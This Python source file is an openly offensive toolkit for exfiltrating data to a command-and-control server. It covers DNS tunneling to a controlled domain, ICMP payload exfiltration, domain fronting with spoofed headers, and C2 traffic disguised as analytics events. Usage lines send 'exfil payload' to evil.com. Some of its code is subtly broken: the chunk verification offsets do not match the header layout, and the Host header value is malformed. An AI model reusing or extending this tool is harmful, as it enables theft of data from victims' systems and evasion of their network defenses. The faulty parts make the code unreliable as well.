#!/usr/bin/env python3
"""Covert Channels Module.

Implements DNS tunneling, HTTPS domain-fronting, and ICMP exfiltration
for stealthy data transfer from instrumented agents to C2.

Usage:
    python covert_channels.py --mode dns --data "exfil payload" --domain evil.com
    python covert_channels.py --mode icmp --data "exfil payload" --target 10.0.3.2
"""

import argparse
import base64
import hashlib
import os
import random
import struct
import sys
import time
from typing import Optional


class DNSTunnel:
    """Encode data as DNS queries to a controlled domain."""

    MAX_LABEL = 63
    MAX_DOMAIN = 253
    CHUNK_SIZE = 30

    def __init__(self, domain: str, encoding: str = "hex"):
        self.domain = domain.rstrip(".")
        self.encoding = encoding

    def encode_data(self, data: bytes) -> list:
        if self.encoding == "hex":
            encoded = data.hex()
        elif self.encoding == "base32":
            import base64
            encoded = base64.b32encode(data).decode()
        elif self.encoding == "base64url":
            encoded = base64.urlsafe_b64encode(data).decode().rstrip("=")
        else:
            encoded = data.hex()

        chunks = []
        for i in range(0, len(encoded), self.CHUNK_SIZE):
            chunk = encoded[i:i + self.CHUNK_SIZE]
            chunks.append(chunk)

        return chunks

    def build_query(self, chunk: str, seq: int, total: int) -> str:
        label = f"{seq:02x}{total:02x}{chunk}"
        if len(label) > self.MAX_LABEL:
            label = label[:self.MAX_LABEL]
        return f"{label}.{self.domain}"

    def tunnel(self, data: bytes) -> list:
        chunks = self.encode_data(data)
        total = len(chunks)
        queries = []
        for i, chunk in enumerate(chunks):
            qname = self.build_query(chunk, i, total)
            queries.append({
                "seq": i,
                "total": total,
                "qname": qname,
                "type": "A",
                "delay": random.uniform(0.5, 2.0)
            })
        return queries

    def decode_response(self, encoded_data: str) -> bytes:
        if self.encoding == "hex":
            return bytes.fromhex(encoded_data)
        elif self.encoding == "base32":
            import base64
            padded = encoded_data + "=" * ((8 - len(encoded_data) % 8) % 8)
            return base64.b32decode(padded)
        elif self.encoding == "base64url":
            import base64
            padded = encoded_data + "=" * ((4 - len(encoded_data) % 4) % 4)
            return base64.urlsafe_b64decode(padded)
        return bytes.fromhex(encoded_data)


class ICMPExfil:
    """Exfiltrate data via ICMP echo request payloads."""

    def __init__(self, target: str, source: str = "0.0.0.0"):
        self.target = target
        self.source = source
        self.chunk_size = 48

    def build_icmp_payload(self, data: bytes, seq: int) -> bytes:
        icmp_type = 8
        icmp_code = 0
        checksum = 0
        identifier = os.getpid() & 0xFFFF
        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, identifier, seq)

        magic = b"\xde\xad"
        total_len = len(data) + len(magic)
        chunk_header = struct.pack("!H", total_len)

        payload = header + magic + chunk_header + data

        checksum = self._calc_checksum(payload)
        payload = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, identifier, seq) + magic + chunk_header + data

        return payload

    def _calc_checksum(self, data: bytes) -> int:
        if len(data) % 2:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s += w
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def tunnel(self, data: bytes) -> list:
        packets = []
        for i in range(0, len(data), self.chunk_size):
            chunk = data[i:i + self.chunk_size]
            seq = i // self.chunk_size + 1
            packets.append({
                "seq": seq,
                "payload": self.build_icmp_payload(chunk, seq),
                "delay": random.uniform(0.1, 1.0)
            })
        return packets


class DomainFronting:
    """HTTPS domain fronting for C2 traffic concealment."""

    CDN_HEADERS = {
        "cloudfront": {
            "host_header": "HOST: {front_domain}",
            "sni": "{front_domain}",
        },
        "azure": {
            "host_header": "HOST: {front_domain}",
            "sni": "{front_domain}",
        },
        "fastly": {
            "host_header": "Host: {front_domain}",
            "sni": "{front_domain}",
        },
    }

    def __init__(self, cdn_provider: str, front_domain: str, real_domain: str):
        self.cdn = cdn_provider.lower()
        self.front_domain = front_domain
        self.real_domain = real_domain

    def build_headers(self) -> dict:
        template = self.CDN_HEADERS.get(self.cdn, self.CDN_HEADERS["cloudfront"])
        return {
            "Host": template["host_header"].format(front_domain=self.front_domain),
            "User-Agent": self._random_ua(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "X-Forwarded-For": self._random_ip(),
        }

    def _random_ua(self) -> str:
        uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        ]
        return random.choice(uas)

    def _random_ip(self) -> str:
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    def get_target_url(self) -> str:
        return f"https://{self.real_domain}/"


class ChunkedExfil:
    """Chunked, jittered exfiltration with integrity checks."""

    def __init__(self, chunk_size: int = 512, jitter_ms: int = 5000, max_retries: int = 3):
        self.chunk_size = chunk_size
        self.jitter_ms = jitter_ms
        self.max_retries = max_retries

    def prepare_chunks(self, data: bytes) -> list:
        data_hash = hashlib.sha256(data).hexdigest()
        chunks = []
        total = (len(data) + self.chunk_size - 1) // self.chunk_size

        for i in range(0, len(data), self.chunk_size):
            chunk = data[i:i + self.chunk_size]
            chunk_num = i // self.chunk_size
            chunk_hash = hashlib.sha256(chunk).hexdigest()[:16]
            header = struct.pack("!H", chunk_num) + struct.pack("!H", total)
            header += bytes.fromhex(chunk_hash)
            chunks.append({
                "seq": chunk_num,
                "total": total,
                "header": header,
                "data": header + chunk,
                "hash": chunk_hash,
                "delay_ms": random.randint(0, self.jitter_ms),
                "retries": 0,
            })

        return {
            "data_hash": data_hash,
            "total_chunks": total,
            "chunks": chunks,
        }

    def verify_chunk(self, chunk_data: bytes) -> bool:
        if len(chunk_data) < 6:
            return False
        received_hash = chunk_data[4:12].hex()
        payload = chunk_data[6:]
        expected_hash = hashlib.sha256(payload).hexdigest()[:16]
        return received_hash == expected_hash


class TrafficMimicry:
    """Generate C2 traffic that mimics legitimate app behavior."""

    COMMON_PATTERNS = {
        "analytics": {
            "endpoints": ["/collect", "/events", "/analytics", "/track"],
            "methods": ["POST", "GET"],
            "content_types": ["application/json", "application/x-www-form-urlencoded"],
        },
        "cdn": {
            "endpoints": ["/images/", "/static/", "/assets/", "/fonts/"],
            "methods": ["GET"],
            "content_types": ["image/png", "application/javascript", "text/css"],
        },
        "api": {
            "endpoints": ["/api/v2/", "/api/v1/", "/graphql"],
            "methods": ["POST", "GET", "PUT"],
            "content_types": ["application/json"],
        },
    }

    def generate_analytics_payload(self, real_data: bytes) -> dict:
        pattern = self.COMMON_PATTERNS["analytics"]
        fake_events = []
        num_fake = random.randint(3, 8)
        for _ in range(num_fake):
            fake_events.append({
                "event": random.choice(["page_view", "click", "scroll", "tap", "swipe"]),
                "timestamp": int(time.time() * 1000) - random.randint(0, 60000),
                "page": random.choice(["/home", "/profile", "/settings", "/feed", "/search"]),
                "properties": {
                    "screen_width": random.choice([1080, 1440, 720]),
                    "screen_height": random.choice([1920, 2560, 1280]),
                    "session_id": hashlib.md5(os.urandom(16)).hexdigest()[:16],
                }
            })

        real_b64 = base64.b64encode(real_data).decode()
        fake_events.append({
            "event": "heartbeat",
            "timestamp": int(time.time() * 1000),
            "data": real_b64[:64] + "..." if len(real_b64) > 64 else real_b64,
        })

        return {
            "endpoint": random.choice(pattern["endpoints"]),
            "content_type": random.choice(pattern["content_types"]),
            "payload": fake_events,
        }

    def wrap_in_legitimate(self, data: bytes, context: str = "analytics") -> dict:
        if context == "analytics":
            return self.generate_analytics_payload(data)
        elif context == "api":
            return {
                "endpoint": random.choice(self.COMMON_PATTERNS["api"]["endpoints"]),
                "content_type": "application/json",
                "payload": {
                    "query": base64.b64encode(data).decode(),
                    "variables": {},
                    "operationId": hashlib.md5(os.urandom(8)).hexdigest(),
                }
            }
        return {"endpoint": "/", "payload": data}


def main():
    parser = argparse.ArgumentParser(description="Covert Channels Toolkit")
    parser.add_argument("--mode", choices=["dns", "icmp", "fronting", "chunked"], required=True)
    parser.add_argument("--data", help="Data to exfiltrate")
    parser.add_argument("--domain", help="DNS tunnel domain")
    parser.add_argument("--target", help="ICMP target / fronting domain")
    parser.add_argument("--output", help="Output file for generated payloads")
    args = parser.parse_args()

    data = args.data.encode() if args.data else b"test exfiltration payload " + os.urandom(32)

    if args.mode == "dns":
        tunnel = DNSTunnel(args.domain or "evil.example.com")
        queries = tunnel.tunnel(data)
        print(f"[*] Generated {len(queries)} DNS queries")
        for q in queries[:5]:
            print(f"    {q['qname']}")
        if len(queries) > 5:
            print(f"    ... and {len(queries) - 5} more")
        if args.output:
            import json
            with open(args.output, "w") as f:
                json.dump(queries, f, indent=2)
            print(f"[+] Saved to {args.output}")

    elif args.mode == "icmp":
        exfil = ICMPExfil(args.target or "10.0.3.2")
        packets = exfil.tunnel(data)
        print(f"[*] Generated {len(packets)} ICMP packets")
        if args.output:
            with open(args.output, "wb") as f:
                for p in packets:
                    f.write(p["payload"] + b"\n")
            print(f"[+] Saved to {args.output}")

    elif args.mode == "fronting":
        front = DomainFronting(
            "cloudfront",
            args.target or "d111111abcdef8.cloudfront.net",
            args.domain or "real-cdn.example.com"
        )
        headers = front.build_headers()
        url = front.get_target_url()
        print(f"[*] Domain fronting: {url}")
        for k, v in headers.items():
            print(f"    {k}: {v}")

    elif args.mode == "chunked":
        chunker = ChunkedExfil()
        result = chunker.prepare_chunks(data)
        print(f"[*] {result['total_chunks']} chunks, hash: {result['data_hash'][:16]}...")


if __name__ == "__main__":
    main()
